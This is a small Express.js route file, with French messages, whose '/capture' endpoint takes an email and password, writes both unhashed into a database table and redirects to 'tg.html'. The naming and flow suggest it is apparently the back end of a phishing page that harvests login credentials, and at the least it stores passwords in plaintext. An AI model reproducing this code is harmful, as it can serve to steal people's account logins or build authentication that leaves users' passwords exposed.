const express = require("express");
const router = express.Router();
const db = require("../db/connection");

// Route POST /capture
router.post("/", (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).send("Champs manquants");
    }

    const sql = "INSERT INTO utilisateur (email, password) VALUES (?, ?)";

    db.query(sql, [email, password], (err, result) => {
        if (err) {
            console.error("Erreur SQL :", err);
            return res.status(500).send("Erreur serveur");
        }

        console.log("Données enregistrées dans 'utilisateur' :", result.insertId);
        res.redirect("tg.html")
    });
});

module.exports = router;
